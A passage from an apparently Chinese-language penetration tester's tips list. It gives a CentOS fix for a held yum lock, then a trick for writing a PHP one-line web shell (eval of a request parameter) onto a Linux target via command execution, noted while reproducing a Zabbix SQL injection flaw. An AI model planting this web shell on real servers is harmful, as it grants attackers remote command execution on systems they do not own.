8、Another app is currently holding the yum lock解决方法

有时候我们在使用centos时会遇到这样的情况：

 rm -rf /var/run/yum.pid #随后重新执行yum进行安装即可

永久禁止该错误：

 cd /etc/yum/pluginconf.d/ ls vim refresh-packagekit.conf  [main] enabled = 0 #将原来的1改为0即可


参考链接：http://blog.itpub.net/29812844/viewspace-1988770/


9、Linux命令执行写入一句话

如果目标机为Linux系统，命令执行写入一句话时，需要在$符号前面加上转义，不然会被Linux系统过滤掉。因为在Linux系统中，$符号的含义为声明变量。

 <?php @eval(\$_REQUEST['cmd']);?>

这个我是在复现Zabbix的sql注入漏洞的时候才发现的。。
